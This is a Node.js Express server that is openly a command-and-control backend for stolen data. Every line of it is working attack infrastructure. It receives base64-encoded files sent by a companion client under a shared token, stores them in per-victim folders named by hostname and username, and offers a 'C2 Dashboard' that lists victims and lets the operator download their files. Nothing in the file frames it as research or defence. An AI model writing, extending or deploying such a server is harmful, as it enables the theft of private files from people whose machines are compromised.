const express = require("express");
const fs = require("fs").promises;
const path = require("path");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));

// --- Determine folder path ---
const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "victims")
  : path.join(__dirname, "victims");

const SECRET_TOKEN = process.env.SECRET_TOKEN || "qutmess"; // Match your Python token

// --- Ensure victims folder exists ---
(async () => {
  try {
    await fs.mkdir(VICTIMS_DIR, { recursive: true });
    console.log(`Victims folder ready at ${VICTIMS_DIR}`);
  } catch (err) { console.error("Setup error:", err); }
})();

// --- Dashboard (Requires Bearer Token in Header) ---
app.get("/", async (req, res) => {
  const auth = req.headers.authorization;
  if (auth !== `Bearer ${SECRET_TOKEN}`) return res.status(403).send("Unauthorized");

  try {
    const victims = await fs.readdir(VICTIMS_DIR);
    res.send(`<h2>C2 Dashboard — ${victims.length} victims</h2>
      <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>`);
  } catch (err) { res.status(500).send("Read error"); }
});

// --- Receive file ---
app.post("/send", async (req, res) => {
  const { hostname, username, file, token } = req.body;
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Unauthorized" });
  if (!file) return res.status(400).json({ error: "No file" });

  const safeFolder = path.basename(`${hostname}_${username}`);
  // Keep the internal path structure
  const safeFilePath = file.name.replace(/\.\./g, ""); 
  const filePath = path.join(VICTIMS_DIR, safeFolder, safeFilePath);

  try {
    await fs.mkdir(path.dirname(filePath), { recursive: true });
    await fs.writeFile(filePath, Buffer.from(file.content, "base64"));
    res.json({ success: true });
  } catch (err) { res.status(500).json({ error: "Write failed" }); }
});

// --- FIX: Download route with Wildcard (*) to support subfolders ---
app.get("/victim/:id/*", async (req, res) => {
  const safeId = path.basename(req.params.id);
  const nestedPath = req.params[0]; // Captures "Documents/file.pdf"
  const filePath = path.join(VICTIMS_DIR, safeId, nestedPath);

  res.download(filePath, (err) => {
    if (err) res.status(404).send("File not found");
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 running on port ${PORT}`));